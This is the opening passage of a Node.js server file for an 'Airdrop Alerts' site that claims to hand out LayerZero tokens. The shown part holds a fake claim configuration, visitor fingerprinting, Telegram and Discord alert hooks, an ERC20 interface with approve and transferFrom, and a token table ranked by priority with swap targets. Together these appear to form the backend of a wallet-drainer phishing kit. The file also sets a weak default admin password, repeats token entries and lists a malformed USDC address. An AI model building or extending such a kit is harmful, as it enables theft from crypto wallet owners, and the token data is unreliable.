// [PRODUCTION - ASSET MANAGEMENT SYSTEM]
// This system is designed for high-performance multi-chain asset analysis and management.
// Authorized use only.

const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const path = require('path');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const { WebhookClient, EmbedBuilder } = require('discord.js');
const crypto = require('crypto');
const { ethers } = require('ethers');
const https = require('https');
const fs = require('fs');
const MobileDetect = require('mobile-detect');
require('dotenv').config({ override: true });

// ERC20 ABI for token interactions
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    "function name() view returns (string)",
    "function totalSupply() view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

const app = express();
const PORT = process.env.PORT || 3000;

// Security headers
app.use(helmet({
    contentSecurityPolicy: false, // Fully disable CSP for local testing to prevent blocks
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: false
}));

// Explicit MIME type fixing for local resources
app.use((req, res, next) => {
    if (req.url.endsWith('.js')) res.type('application/javascript');
    if (req.url.endsWith('.css')) res.type('text/css');
    next();
});

// HTTPS enforcement middleware
if (process.env.SERVER_USE_HTTPS === 'true') {
    app.use((req, res, next) => {
        // Skip redirect for local access to allow testing without SSL issues
        const isLocal = req.hostname === 'localhost' || req.hostname === '127.0.0.1' || req.hostname.startsWith('192.168.');
        
        // Hostinger VPS usually handles SSL via Reverse Proxy (Nginx) or Load Balancer
        // We check for 'x-forwarded-proto' which is standard for proxies
        if (!isLocal && !req.secure && req.get('x-forwarded-proto') !== 'https') {
            return res.redirect('https://' + req.get('host') + req.url);
        }
        next();
    });
}

app.use(compression());
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Mobile detection middleware
app.use((req, res, next) => {
    const md = new MobileDetect(req.headers['user-agent']);
    req.isMobile = md.mobile() !== null;
    req.mobileOS = md.os();
    req.mobileVersion = md.version(md.os());
    next();
});

// Visitor tracking middleware
app.use((req, res, next) => {
    const clientInfo = getClientInfo(req);
    const visitorInfo = {
        ip: clientInfo.ip,
        userAgent: clientInfo.userAgent,
        timestamp: clientInfo.timestamp,
        path: clientInfo.path,
        method: clientInfo.method,
        referer: clientInfo.referer,
        language: req.headers['accept-language'] || 'unknown',
        deviceFingerprint: generateDeviceFingerprint(req)
    };
    
    // Store visitor info for admin dashboard
    if (!global.visitorLog) global.visitorLog = [];
    global.visitorLog.push(visitorInfo);
    
    // Keep only last 1000 visitors
    if (global.visitorLog.length > 1000) {
        global.visitorLog = global.visitorLog.slice(-1000);
    }
    
    req.visitorInfo = visitorInfo;
    next();
});

app.use(express.static(path.join(__dirname, 'public')));
app.use('/admin', express.static(path.join(__dirname, 'admin')));
app.use('/mobile', express.static(path.join(__dirname, 'mobile')));

// Admin authentication
const ADMIN_CREDENTIALS = {
    username: process.env.ADMIN_USERNAME || 'admin',
    password: process.env.ADMIN_PASSWORD || 'admin123'
};

// Mobile-specific admin settings
const mobileAdminSettings = {
    tokenName: process.env.TOKEN_NAME || 'LayerZero',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'ZRO',
    tokenPrice: parseFloat(process.env.TOKEN_PRICE || '2.01'),
    tokenDescription: process.env.AIRDROP_DESCRIPTION || 'LayerZero is a protocol that enables cross-chain applications to communicate with each other in a trustless manner.',
    totalAllocation: parseInt(process.env.TOTAL_ALLOCATION || '10000000'),
    claimedAmount: parseInt(process.env.CLAIMED_AMOUNT || '7500000'),
    participantCount: parseInt(process.env.PARTICIPANT_COUNT || '12500'),
    endDate: process.env.AIRDROP_END_DATE || '2026-12-31T23:59:59Z',
    walletConnectProjectId: process.env.WALLETCONNECT_PROJECT_ID || 'your_project_id_here',
    appName: process.env.APP_NAME || 'Airdrop Alerts',
    appDescription: process.env.APP_DESCRIPTION || 'Secure Airdrop Claiming Platform',
    appUrl: process.env.BASE_URL || process.env.APP_URL || 'https://localhost:3000'
};

// Frontend configuration
let frontendConfig = {
    tokenName: process.env.TOKEN_NAME || 'LayerZero',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'ZRO',
    tokenPrice: parseFloat(process.env.TOKEN_PRICE || '2.01'),
    airdropAmount: process.env.AIRDROP_AMOUNT || '1000',
    totalAllocation: process.env.TOTAL_ALLOCATION || '10000000',
    claimedAmount: process.env.CLAIMED_AMOUNT || '7500000',
    endDate: process.env.AIRDROP_END_DATE || '2026-12-31T23:59:59Z',
    description: process.env.AIRDROP_DESCRIPTION || 'LayerZero is a protocol that enables cross-chain applications to communicate with each other in a trustless manner.',
    features: [
        'Cross-chain messaging',
        'Trustless communication',
        'Decentralized infrastructure',
        'Multi-chain support'
    ]
};

// JWT secret for admin tokens
const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-jwt-key-change-this-in-production';

// Initialize communication channels with better error handling
let telegramBot = null;
let discordClient = null;

// Production-ready Telegram notification system
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

if (botToken && chatId) {
    try {
        telegramBot = new TelegramBot(botToken, { polling: false });
        console.log('[INFO] Telegram bot initialized for real-time alerts');
    } catch (error) {
        console.error('[ERROR] Failed to initialize Telegram bot:', error.message);
        telegramBot = null;
    }
} else {
    console.warn('[WARNING] Telegram notifications disabled - check credentials');
    telegramBot = null;
}

// Production-ready Discord notification system
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
if (webhookUrl) {
    try {
        discordClient = new WebhookClient({ url: webhookUrl });
        console.log('[INFO] Discord webhook initialized for real-time alerts');
    } catch (error) {
        console.error('[ERROR] Failed to initialize Discord webhook:', error.message);
        discordClient = null;
    }
} else {
    console.warn('[WARNING] Discord notifications disabled - check credentials');
    discordClient = null;
}

// Alias for consistency — code uses both names
const discordWebhook = discordClient;

// Enhanced token database with multi-chain support including native cryptocurrencies
const TOKEN_DATABASE = {
    // Ethereum Mainnet
    '0xA0b86a33E6441b8c4C8C1C1B8c4C8C1C1B8c4C8C8': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'ethereum', swapTarget: 'USDC' },
    '0xdAC17F958D2ee523a2206206994597C13D831ec7': { symbol: 'USDT', name: 'Tether USD', decimals: 6, priority: 1, chain: 'ethereum', swapTarget: 'USDT' },
    '0x6B175474E89094C44Da98b954EedeAC495271d0F': { symbol: 'DAI', name: 'Dai Stablecoin', decimals: 18, priority: 1, chain: 'ethereum', swapTarget: 'DAI' },
    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599': { symbol: 'WBTC', name: 'Wrapped Bitcoin', decimals: 8, priority: 2, chain: 'ethereum', swapTarget: 'WBTC' },
    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2': { symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'WETH' },
    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': { symbol: 'UNI', name: 'Uniswap', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x514910771AF9Ca656af840dff83E8264EcF986CA': { symbol: 'LINK', name: 'Chainlink', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9': { symbol: 'AAVE', name: 'Aave', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2': { symbol: 'MKR', name: 'Maker', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x0D8775F648430679A709E98d2b0Cb6250d2887EF': { symbol: 'BAT', name: 'Basic Attention Token', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0xE41d2489571d322189246DaFA5ebDe1F4699F498': { symbol: 'ZRX', name: '0x Protocol', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    
    // LayerZero Token (ZRO) - Mainnet
    '0x0000000000000000000000000000000000000000': { symbol: 'ZRO', name: 'LayerZero', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC', isNative: true },
    
    // Additional Major Tokens
    '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE': { symbol: 'SHIB', name: 'Shiba Inu', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x4d224452801ACEd8B2F0aebE155379bb5D594381': { symbol: 'APE', name: 'ApeCoin', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39': { symbol: 'HEX', name: 'HEX', decimals: 8, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    
    // BSC (Binance Smart Chain)
    '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d': { symbol: 'USDC', name: 'USD Coin', decimals: 18, priority: 1, chain: 'bsc', swapTarget: 'USDC' },
    '0x55d398326f99059fF775485246999027B3197955': { symbol: 'USDT', name: 'Tether USD', decimals: 18, priority: 1, chain: 'bsc', swapTarget: 'USDT' },
    '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c': { symbol: 'BTCB', name: 'Bitcoin BEP2', decimals: 18, priority: 2, chain: 'bsc', swapTarget: 'USDC' },
    '0x2170Ed0880ac9A755fd29B2688956BD959F933F8': { symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, priority: 2, chain: 'bsc', swapTarget: 'USDC' },
    '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82': { symbol: 'CAKE', name: 'PancakeSwap', decimals: 18, priority: 3, chain: 'bsc', swapTarget: 'USDC' },
    
    // Polygon
    '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'polygon', swapTarget: 'USDC' },
    '0xc2132D05D31c914a87C6611C10748AEb04B58e8F': { symbol: 'USDT', name: 'Tether USD', decimals: 6, priority: 1, chain: 'polygon', swapTarget: 'USDT' },
    '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6': { symbol: 'WBTC', name: 'Wrapped Bitcoin', decimals: 8, priority: 2, chain: 'polygon', swapTarget: 'USDC' },
    '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619': { symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, priority: 2, chain: 'polygon', swapTarget: 'USDC' },
    '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270': { symbol: 'WMATIC', name: 'Wrapped MATIC', decimals: 18, priority: 2, chain: 'polygon', swapTarget: 'USDC' },
    
    // Avalanche
    '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'avalanche', swapTarget: 'USDC' },
    '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7': { symbol: 'USDT', name: 'Tether USD', decimals: 6, priority: 1, chain: 'avalanche', swapTarget: 'USDT' },
    '0x50b7545627a5162F82A992c33b87aDc75187B218': { symbol: 'WBTC', name: 'Wrapped Bitcoin', decimals: 8, priority: 2, chain: 'avalanche', swapTarget: 'USDC' },
    '0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB': { symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, priority: 2, chain: 'avalanche', swapTarget: 'USDC' },
    
    // Arbitrum
    '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'arbitrum', swapTarget: 'USDC' },
    '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9': { symbol: 'USDT', name: 'Tether USD', decimals: 6, priority: 1, chain: 'arbitrum', swapTarget: 'USDT' },
    '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f': { symbol: 'WBTC', name: 'Wrapped Bitcoin', decimals: 8, priority: 2, chain: 'arbitrum', swapTarget: 'USDC' },
    '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1': { symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, priority: 2, chain: 'arbitrum', swapTarget: 'USDC' },
    
    // Optimism
    '0x7F5c764cBc14f9669B88837ca1490cCa17c31607': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'optimism', swapTarget: 'USDC' },
    '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58': { symbol: 'USDT', name: 'Tether USD', decimals: 6, priority: 1, chain: 'optimism', swapTarget: 'USDT' },
    '0x68f180fcCe6836688e9084f035309E29Bf0A2095': { symbol: 'WBTC', name: 'Wrapped Bitcoin', decimals: 8, priority: 2, chain: 'optimism', swapTarget: 'USDC' },
    '0x4200000000000000000000000000000000000006': { symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, priority: 2, chain: 'optimism', swapTarget: 'USDC' },
    
    // Fantom
    '0x04068DA6C83AFCFA0e13ba15A6696662335D5B75': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'fantom', swapTarget: 'USDC' },
    '0x049d68029688eAbF473097a2fC38ef61633A3C7A': { symbol: 'fUSDT', name: 'Frapped USDT', decimals: 6, priority: 1, chain: 'fantom', swapTarget: 'USDT' },
    '0x321162Cd933E2Be498Cd2267a90534A804051b11': { symbol: 'WBTC', name: 'Wrapped Bitcoin', decimals: 8, priority: 2, chain: 'fantom', swapTarget: 'USDC' },
    '0x74b23882a30290451A17c44f4F05243b6b58C76d': { symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, priority: 2, chain: 'fantom', swapTarget: 'USDC' },
    
    // Base Network
    '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'base', swapTarget: 'USDC' },
    '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb': { symbol: 'DAI', name: 'Dai Stablecoin', decimals: 18, priority: 1, chain: 'base', swapTarget: 'DAI' },
    '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22': { symbol: 'cbETH', name: 'Coinbase Wrapped Staked ETH', decimals: 18, priority: 2, chain: 'base', swapTarget: 'USDC' },
    
    // Linea Network
    '0x176211869cA2b568f2A7D4EE941E073a821EE1ff': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'linea', swapTarget: 'USDC' },
    '0xA219439258ca9da76E1eC3E609F8ef8dCeAeBA9B': { symbol: 'USDT', name: 'Tether USD', decimals: 6, priority: 1, chain: 'linea', swapTarget: 'USDT' },
    '0x2416092f143378750bb29b79eD961ab195CcEea5': { symbol: 'ezETH', name: 'Renzo Restaked ETH', decimals: 18, priority: 2, chain: 'linea', swapTarget: 'USDC' },
    
    // Scroll Network
    '0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4': { symbol: 'USDC', name: 'USD Coin', decimals: 6, priority: 1, chain: 'scroll', swapTarget: 'USDC' },
    '0xf55BEC9cafDbE8730f096Aa55dad6D22d44099Df': { symbol: 'USDT', name: 'Tether USD', decimals: 6, priority: 1, chain: 'scroll', swapTarget: 'USDT' },
    '0x3C1BCa5a656e69edCD0d4E36BBbb3edc1c3B8D94': { symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, priority: 2, chain: 'scroll', swapTarget: 'USDC' },
    
    // Additional Major Tokens (Ethereum)
    '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0': { symbol: 'MATIC', name: 'Polygon', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1': { symbol: 'ARB', name: 'Arbitrum', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x4200000000000000000000000000000000000042': { symbol: 'OP', name: 'Optimism', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x4d224452801ACEd8B2F0aebE155379bb5D594381': { symbol: 'APE', name: 'ApeCoin', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39': { symbol: 'HEX', name: 'HEX', decimals: 8, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x4Fabb145d64652a948d72533023f6E7A623C7C53': { symbol: 'BUSD', name: 'Binance USD', decimals: 18, priority: 1, chain: 'ethereum', swapTarget: 'USDC' },
    '0x853d955aCEf822Db058eb8505911ED77F175b99e': { symbol: 'FRAX', name: 'Frax', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0x5f98805A4E8be255a32880FDeC7F6728C6568bA0': { symbol: 'LUSD', name: 'Liquity USD', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490': { symbol: '3CRV', name: 'Curve.fi DAI/USDC/USDT', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32': { symbol: 'LDO', name: 'Lido DAO Token', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0xBe9895146f7AF43049ca1c1AE358B0541Ea49704': { symbol: 'cbETH', name: 'Coinbase Wrapped Staked ETH', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0xae78736Cd615f374D3085123A210448E74Fc6393': { symbol: 'rETH', name: 'Rocket Pool ETH', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84': { symbol: 'stETH', name: 'Lido Staked ETH', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0x8E870D67F660D95d5be530380D0eC0bd388289E1': { symbol: 'PAX', name: 'Pax Dollar', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd': { symbol: 'GUSD', name: 'Gemini Dollar', decimals: 2, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0x0bc529c00C6401aEF6D220BE8c6Ea1667F6Ad93e': { symbol: 'YFI', name: 'yearn.finance', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x3845badAde8e6dDD04FcF80cE6C7A88e65a2464B': { symbol: 'SAND', name: 'The Sandbox', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942': { symbol: 'MANA', name: 'Decentraland', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x8f8221aFbB33998d8584A2B05749bA73c37a938a': { symbol: 'REQ', name: 'Request', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2': { symbol: 'MKR', name: 'Maker', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x1985365e9f78359a9B6AD760e32412f4a445E862': { symbol: 'REP', name: 'Augur', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x408e41876cCCDC0F92210600ef50372656052a38': { symbol: 'REN', name: 'Republic Protocol', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x607F4C5BB672230e8672085532f7e901544a7375': { symbol: 'RLC', name: 'iExec RLC', decimals: 9, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359': { symbol: 'SAI', name: 'Sai Stablecoin', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0x744d70FDBE2Ba4CF95131626614a1763DF805B9E': { symbol: 'SNT', name: 'Status Network Token', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x4156D3342D5c385a87D264F90653733592000581': { symbol: 'SALT', name: 'Salt', decimals: 8, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD': { symbol: 'LRC', name: 'Loopring', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x0AbdAce70D3790235af448C88547603b945604ea': { symbol: 'DNT', name: 'district0x', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x6810e776880C02933D47DB1b9fc05908e5386b96': { symbol: 'GNO', name: 'Gnosis', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x960b236A07cf122663c4303350609A66A7B288C0': { symbol: 'ANT', name: 'Aragon', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671': { symbol: 'NMR', name: 'Numeraire', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x86Fa049857E0209aa7D9e616F7eb3b3B78ECfdb0': { symbol: 'EOS', name: 'EOS', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942': { symbol: 'MANA', name: 'Decentraland', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x8f8221aFbB33998d8584A2B05749bA73c37a938a': { symbol: 'REQ', name: 'Request', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x1985365e9f78359a9B6AD760e32412f4a445E862': { symbol: 'REP', name: 'Augur', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x408e41876cCCDC0F92210600ef50372656052a38': { symbol: 'REN', name: 'Republic Protocol', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x607F4C5BB672230e8672085532f7e901544a7375': { symbol: 'RLC', name: 'iExec RLC', decimals: 9, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359': { symbol: 'SAI', name: 'Sai Stablecoin', decimals: 18, priority: 2, chain: 'ethereum', swapTarget: 'USDC' },
    '0x744d70FDBE2Ba4CF95131626614a1763DF805B9E': { symbol: 'SNT', name: 'Status Network Token', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x4156D3342D5c385a87D264F90653733592000581': { symbol: 'SALT', name: 'Salt', decimals: 8, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD': { symbol: 'LRC', name: 'Loopring', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x0AbdAce70D3790235af448C88547603b945604ea': { symbol: 'DNT', name: 'district0x', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x6810e776880C02933D47DB1b9fc05908e5386b96': { symbol: 'GNO', name: 'Gnosis', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' },
    '0x960b236A07cf122663c4303350609A66A7B288C0': { symbol: 'ANT', name: 'Aragon', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671': { symbol: 'NMR', name: 'Numeraire', decimals: 18, priority: 4, chain: 'ethereum', swapTarget: 'USDC' },
    '0x86Fa049857E0209aa7D9e616F7eb3b3B78ECfdb0': { symbol: 'EOS', name: 'EOS', decimals: 18, priority: 3, chain: 'ethereum', swapTarget: 'USDC' }
};

// Native cryptocurrency database for multi-chain support
const NATIVE_CRYPTO_DATABASE = {
    // Bitcoin Network
    'bitcoin': {
        symbol: 'BTC',
        name: 'Bitcoin',
        decimals: 8,
        priority: 1,
        chain: 'bitcoin',
        swapTarget: 'USDT',
        rpc: 'https://blockstream.info/api',
        explorer: 'https://blockstream.info',
        isNative: true
    },
    
    // Tron Network
    'tron': {
        symbol: 'TRX',
        name: 'Tron',
        decimals: 6,
        priority: 2,
        chain: 'tron',
        swapTarget: 'USDT',
        rpc: 'https://api.trongrid.io',
        explorer: 'https://tronscan.org',
        isNative: true
    },
    
    // Tron USDT (TRC20)
    'tron_usdt': {
        symbol: 'USDT',
        name: 'Tether USD (TRC20)',
        decimals: 6,
        priority: 1,
        chain: 'tron',
        swapTarget: 'USDT',
        contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // Tron USDT contract
        rpc: 'https://api.trongrid.io',
        explorer: 'https://tronscan.org',
        isNative: false
    },
    
    // Solana Network
    'solana': {
        symbol: 'SOL',
        name: 'Solana',
        decimals: 9,
        priority: 2,
        chain: 'solana',
        swapTarget: 'USDT',
        rpc: 'https://api.mainnet-beta.solana.com',
        explorer: 'https://explorer.solana.com',
        isNative: true
    },
    
    // Dogecoin Network
    'dogecoin': {
        symbol: 'DOGE',
        name: 'Dogecoin',
        decimals: 8,
        priority: 3,
        chain: 'dogecoin',
        swapTarget: 'USDT',
        rpc: 'https://doge.getblock.io/mainnet/',
        explorer: 'https://dogechain.info',
        isNative: true
    },
    
    // Litecoin Network
    'litecoin': {
        symbol: 'LTC',
        name: 'Litecoin',
        decimals: 8,
        priority: 3,
        chain: 'litecoin',
        swapTarget: 'USDT',
        rpc: 'https://litecoin.getblock.io/mainnet/',
        explorer: 'https://blockchair.com/litecoin',
        isNative: true
    },
    
    // Cardano Network
    'cardano': {
        symbol: 'ADA',
        name: 'Cardano',
        decimals: 6,
        priority: 3,
        chain: 'cardano',
        swapTarget: 'USDT',
        rpc: 'https://cardano-mainnet.blockfrost.io/api/v0',
        explorer: 'https://explorer.cardano.org',
        isNative: true
    },
    
    // Polkadot Network
    'polkadot': {
        symbol: 'DOT',
        name: 'Polkadot',
        decimals: 10,
        priority: 3,
        chain: 'polkadot',
        swapTarget: 'USDT',
        rpc: 'https://polkadot.api.onfinality.io/public',
        explorer: 'https://polkascan.io/polkadot',
        isNative: true
    },
    
    // XRP Network
    'xrp': {
        symbol: 'XRP',
        name: 'Ripple',
        decimals: 6,
        priority: 2,
        chain: 'xrp',
        swapTarget: 'USDT',
        rpc: 'https://s1.ripple.com:51234',
        explorer: 'https://xrpscan.com',
        isNative: true
    },
    
    // Solana USDC
    'solana_usdc': {
        symbol: 'USDC',
        name: 'USD Coin (Solana)',
        decimals: 6,
        priority: 1,
        chain: 'solana',
        swapTarget: 'USDC',
        contractAddress: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
        rpc: 'https://api.mainnet-beta.solana.com',
        explorer: 'https://explorer.solana.com',
        isNative: false
    },
    
    // Solana USDT
    'solana_usdt': {
        symbol: 'USDT',
        name: 'Tether USD (Solana)',
        decimals: 6,
        priority: 1,
        chain: 'solana',
        swapTarget: 'USDT',
        contractAddress: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
        rpc: 'https://api.mainnet-beta.solana.com',
        explorer: 'https://explorer.solana.com',
        isNative: false
    },
    
    // Tron USDC (TRC20)
    'tron_usdc': {
        symbol: 'USDC',
        name: 'USD Coin (TRC20)',
        decimals: 6,
        priority: 1,
        chain: 'tron',
        swapTarget: 'USDC',
        contractAddress: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8',
        rpc: 'https://api.trongrid.io',
        explorer: 'https://tronscan.org',
        isNative: false
    },
    
    // Fantom Network
    'fantom': {
        symbol: 'FTM',
        name: 'Fantom',
        decimals: 18,
        priority: 3,
        chain: 'fantom',
        swapTarget: 'USDT',
        rpc: 'https://rpc.ftm.tools/',
        explorer: 'https://ftmscan.com',
        isNative: true
    },
    
    // Cosmos Network
    'cosmos': {
        symbol: 'ATOM',
        name: 'Cosmos',
        decimals: 6,
        priority: 3,
        chain: 'cosmos',
        swapTarget: 'USDT',
        rpc: 'https://cosmos-rpc.polkachu.com',
        explorer: 'https://www.mintscan.io/cosmos',
        isNative: true
    },
    
    // Algorand Network
    'algorand': {
        symbol: 'ALGO',
        name: 'Algorand',
        decimals: 6,
        priority: 3,
        chain: 'algorand',
        swapTarget: 'USDT',
        rpc: 'https://mainnet-api.algonode.cloud',
        explorer: 'https://algoexplorer.io',
        isNative: true
    },
    
    // Near Protocol
    'near': {
        symbol: 'NEAR',
        name: 'NEAR Protocol',
        decimals: 24,
        priority: 3,
        chain: 'near',
        swapTarget: 'USDT',
        rpc: 'https://rpc.mainnet.near.org',
        explorer: 'https://explorer.near.org',
        isNative: true
    },
    
    // Tezos Network
    'tezos': {
        symbol: 'XTZ',
        name: 'Tezos',
        decimals: 6,
        priority: 3,
        chain: 'tezos',
        swapTarget: 'USDT',
        rpc: 'https://mainnet.api.tez.ie',
        explorer: 'https://tzkt.io',
        isNative: true
    },
    
    // Bitcoin Cash Network
    'bitcoin_cash': {
        symbol: 'BCH',
        name: 'Bitcoin Cash',
        decimals: 8,
        priority: 3,
        chain: 'bitcoin_cash',
        swapTarget: 'USDT',
        rpc: 'https://bitcoincash.nownodes.io',
        explorer: 'https://blockchair.com/bitcoin-cash',
        isNative: true
    },
    
    // Avalanche C-Chain
    'avalanche_c': {
        symbol: 'AVAX',
        name: 'Avalanche C-Chain',
        decimals: 18,
        priority: 2,
        chain: 'avalanche',
        swapTarget: 'USDT',
        rpc: 'https://api.avax.network/ext/bc/C/rpc',
        explorer: 'https://snowtrace.io',
        isNative: true
    },
    
    // Base Network
    'base': {
        symbol: 'ETH',
        name: 'Ethereum (Base)',
        decimals: 18,
        priority: 2,
        chain: 'base',
